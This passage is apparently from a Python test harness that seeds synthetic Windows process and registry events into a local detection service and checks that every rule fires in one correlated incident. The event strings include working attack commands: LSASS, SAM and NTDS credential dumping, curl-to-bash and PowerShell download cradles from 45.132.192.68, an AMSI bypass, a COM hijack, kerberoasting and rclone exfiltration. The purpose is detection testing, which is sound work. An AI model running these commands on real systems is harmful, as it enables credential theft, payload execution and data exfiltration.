                    r"reg.exe save HKLM\SAM C:\Users\redteam.ops\AppData\Local\Temp\sam.hive",
                    pid=5240, ppid=4510, integrity="High"))

    ev.append(proc(step(1), G["procdump"], G["ops"], r"C:\Users\redteam.ops\AppData\Local\Temp\procdump64.exe",
                    r"procdump64.exe -ma lsass.exe C:\Users\redteam.ops\AppData\Local\Temp\lsass3.dmp",
                    pid=5250, ppid=4510, integrity="High"))

    ev.append(proc(step(1), G["ntdsutil"], G["ops"], r"C:\Windows\System32\ntdsutil.exe",
                    r'ntdsutil.exe "ac i ntds" "ifm" "create full C:\Users\redteam.ops\AppData\Local\Temp\ntds" q q',
                    pid=5260, ppid=4510, integrity="High"))

    ev.append(proc(step(1), G["mavinject"], G["ops"], r"C:\Windows\System32\mavinject.exe",
                    r"mavinject.exe 4930 /INJECTRUNNING C:\Users\redteam.ops\AppData\Local\Temp\evil.dll",
                    pid=5270, ppid=4510))

    ev.append(proc(step(1), G["wsl"], G["ops"], r"C:\Windows\System32\wsl.exe",
                    r'wsl.exe -e /bin/bash -c "curl http://45.132.192.68/stage7.sh | bash"',
                    pid=5280, ppid=4510))

    ev.append(proc(step(1), G["msbuild"], G["ops"],
                    r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe",
                    r"MSBuild.exe C:\Users\redteam.ops\AppData\Local\Temp\evil.csproj",
                    pid=5290, ppid=4510))

    ev.append(proc(step(1), G["forfiles"], G["ops"], r"C:\Windows\System32\forfiles.exe",
                    r"forfiles.exe /p C:\Users\redteam.ops\AppData\Local\Temp /m stage8.exe /c stage8.exe",
                    pid=5300, ppid=4510))

    ev.append(proc(step(1), G["tscon"], G["ops"], r"C:\Windows\System32\tscon.exe",
                    "tscon.exe 3 /dest:rdp-tcp#1", pid=5310, ppid=4510, integrity="High"))

    ev.append(proc(step(1), G["sharphound"], G["ops"], r"C:\Users\redteam.ops\AppData\Local\Temp\SharpHound.exe",
                    "SharpHound.exe -c All --zipfilename loot.zip", pid=5320, ppid=4510))

    ev.append(proc(step(1), G["rclone"], G["ops"], r"C:\Users\redteam.ops\AppData\Local\Temp\rclone.exe",
                    r"rclone.exe copy C:\Users\redteam.ops\Documents remote:backup --config C:\Users\redteam.ops\AppData\Local\Temp\rclone.conf",
                    pid=5330, ppid=4510))

    ev.append(proc(step(1), G["rubeus"], G["ops"], r"C:\Users\redteam.ops\AppData\Local\Temp\Rubeus.exe",
                    "Rubeus.exe kerberoast /outfile:C:\\Users\\redteam.ops\\AppData\\Local\\Temp\\hashes.txt",
                    pid=5340, ppid=4510))

    ev.append(proc(step(1), G["ps_downgrade"], G["ops"],
                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    r"powershell -version 2 -nop -w hidden -c \"IEX (New-Object Net.WebClient)."
                    r"DownloadString('http://45.132.192.68/legacy.ps1')\"",
                    pid=5350, ppid=4510))

    ev.append(proc(step(1), G["ps_amsi"], G["ops"],
                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    r"powershell -nop -w hidden -c \"[Ref].Assembly.GetType("
                    r"'System.Management.Automation.AmsiUtils').GetField('amsiInitFailed',"
                    r"'NonPublic,Static').SetValue($null,$true)\"",
                    pid=5360, ppid=4510))

    ev.append(proc(step(1), G["bitsadmin"], G["ops"], r"C:\Windows\System32\bitsadmin.exe",
                    r"bitsadmin.exe /transfer myjob http://45.132.192.68/stage9.exe "
                    r"C:\Users\redteam.ops\AppData\Local\Temp\stage9.exe",
                    pid=5370, ppid=4510))

    ev.append(proc(step(1), G["com_hijack"], G["ops"],
                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    r"powershell -nop -c \"New-Item -Path "
                    r"'HKCU:\Software\Classes\CLSID\{42aedc87-2188-41fd-b9a3-0c966feabec1}\InprocServer32' "
                    r"-Force; Set-ItemProperty -Path "
                    r"'HKCU:\Software\Classes\CLSID\{42aedc87-2188-41fd-b9a3-0c966feabec1}\InprocServer32' "
                    r"-Name '(default)' -Value 'C:\Users\redteam.ops\AppData\Local\Temp\evil.dll'\"",
                    pid=5380, ppid=4510))
    ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                         ProcessGuid=G["com_hijack"],
                         TargetObject=r"HKU\S-1-5-21-1-2-3-1001\Software\Classes\CLSID"
                         r"\{42aedc87-2188-41fd-b9a3-0c966feabec1}\InprocServer32\(Default)",
                         Details=r"C:\Users\redteam.ops\AppData\Local\Temp\evil.dll"))

    ev.append(proc(step(1), G["juicypotato"], G["ops"], r"C:\Users\redteam.ops\AppData\Local\Temp\JuicyPotato.exe",
                    "JuicyPotato.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -t *",
                    pid=5390, ppid=4510, integrity="High"))

    # === FTP LOLBAS execution, off "ops" ===
    ev.append(proc(step(2), G["ftp"], G["ops"], r"C:\Windows\System32\ftp.exe",
                    r"ftp.exe -s:C:\Users\redteam.ops\AppData\Local\Temp\ftp.txt",
                    pid=4980, ppid=4510))
    ev.append(proc(step(1), G["ftp_cmd"], G["ftp"], r"C:\Windows\System32\cmd.exe",
                    r"C:\Windows\system32\cmd.exe /C calc.exe", pid=4990, ppid=4980))

    # === Arrivals framed as coming from the network, parented at root ===
    # Remote WMI/DCOM persistence.
    ev.append(raw_event(13, step(2), Image=r"C:\Windows\System32\wbem\wmiprvse.exe",
                         ProcessGuid=G["wmiprvse"], ParentProcessGuid=G["root"],
                         TargetObject=r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\wmipers",
                         Details=r"rundll32.exe C:\Windows\Temp\a.dll, DllMain"))

    # PsExec lateral-movement arrival.
    ev.append(proc(step(1), G["psexec"], G["root"], r"C:\Windows\PSEXESVC.exe",
                    "PSEXESVC.exe -accepteula", pid=5000, ppid=628))
    ev.append(raw_event(17, step(1), Image=r"C:\Windows\PSEXESVC.exe",
                         ProcessGuid=G["psexec"], PipeName=r"\PSEXESVC"))
    ev.append(raw_event(18, step(0), Image=r"C:\Windows\PSEXESVC.exe",
                         ProcessGuid=G["psexec"], PipeName=r"\PSEXESVC"))

    # IIS worker process compromised via a web request; spawns a shell and
    # dumps app-pool credentials with appcmd.
    ev.append(proc(step(1), G["w3wp"], G["root"], r"C:\Windows\System32\inetsrv\w3wp.exe",
                    r'c:\windows\system32\inetsrv\w3wp.exe -ap "DefaultAppPool"',
                    pid=5010, ppid=612, user="IIS APPPOOL\\DefaultAppPool"))
    ev.append(proc(step(1), G["w3wp_cmd"], G["w3wp"], r"C:\Windows\System32\cmd.exe",
                    '"cmd.exe" /c whoami', pid=5020, ppid=5010, user="IIS APPPOOL\\DefaultAppPool"))
    ev.append(proc(step(1), G["appcmd"], G["w3wp"], r"C:\Windows\System32\inetsrv\appcmd.exe",
                    "appcmd.exe list apppool /text:processmodel.password", pid=5030, ppid=5010,
                    user="IIS APPPOOL\\DefaultAppPool"))

    # SQL Server compromised, xp_cmdshell spawns a shell.
    ev.append(proc(step(1), G["sqlservr"], G["root"],
                    r"C:\Program Files\Microsoft SQL Server\MSSQL10.SQLEXPRESS\MSSQL\Binn\sqlservr.exe",
                    r'"sqlservr.exe" -sSQLEXPRESS', pid=5040, ppid=616, user="NT SERVICE\\MSSQL$SQLEXPRESS"))
    ev.append(proc(step(1), G["sql_cmd"], G["sqlservr"], r"C:\Windows\System32\cmd.exe",
                    r'"cmd.exe" /c whoami', pid=5050, ppid=5040, user="NT SERVICE\\MSSQL$SQLEXPRESS"))

    # PowerShell remoting session executing a command.
    ev.append(proc(step(1), G["wsmprovhost"], G["root"], r"C:\Windows\System32\wsmprovhost.exe",
                    "C:\\Windows\\system32\\wsmprovhost.exe -Embedding", pid=5060, ppid=620))
    ev.append(proc(step(1), G["hostname"], G["wsmprovhost"], r"C:\Windows\System32\HOSTNAME.EXE",
                    '"HOSTNAME.EXE"', pid=5070, ppid=5060))

    # Direct SAM manipulation.
    ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\lsass.exe", ProcessGuid=G["lsass"],
                         ParentProcessGuid=G["root"],
                         TargetObject=r"HKLM\SAM\SAM\Domains\Account\Users\Names\svc_backup\(Default)",
                         Details="Binary Data"))

    return ev


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Seed one incident that fires every rule in the corpus."
    )
    parser.add_argument("--url", default="http://localhost:8000/ingest")
    parser.add_argument("--delay", type=float, default=0.05)
    args = parser.parse_args()

    all_events = events()
    print(f"Seeding full-coverage range on {HOST}: {len(all_events)} events\n")

    fired, incident_ids = post_events(all_events, args.url, args.delay)

    print("\nRules fired:")
    for rule_id, count in sorted(fired.items()):
        print(f"  {rule_id:10} x{count}")

    missing = EXPECTED_RULES - set(fired)
    print(f"\n{len(fired)}/{len(EXPECTED_RULES)} rules fired.")
    if missing:
        print(f"Did not fire: {', '.join(sorted(missing))}")
    else:
        print("Every rule in the corpus fired at least once.")

    print(f"Distinct incidents created: {len(incident_ids)} ({', '.join(sorted(incident_ids)) or 'none'})")
    if len(incident_ids) == 1:
        print("Confirmed: everything correlated into a single incident.")
    elif len(incident_ids) > 1:
        print("Warning: the run split across more than one incident.")

    print(f"\nOpen http://localhost:8000 and expand the {HOST} incident.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
